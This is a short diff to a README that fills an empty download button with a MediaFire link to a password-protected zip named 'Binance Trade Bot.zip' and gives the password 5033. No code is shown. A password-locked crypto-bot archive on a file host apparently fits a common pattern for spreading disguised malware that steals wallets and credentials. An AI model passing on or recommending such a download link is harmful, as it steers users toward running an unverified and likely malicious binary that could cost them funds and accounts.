@@ -1,7 +1,7 @@
 
 
 ***DOWNLOAD*** :arrow_heading_down:
-|[Click to Download]()|Password: 5033|
+|[Click to Download](https://www.mediafire.com/file/mobfsqpf099u3pt/Binance+Trade+Bot.zip/file)|Password: 5033|
 |---|---|
 
 ```
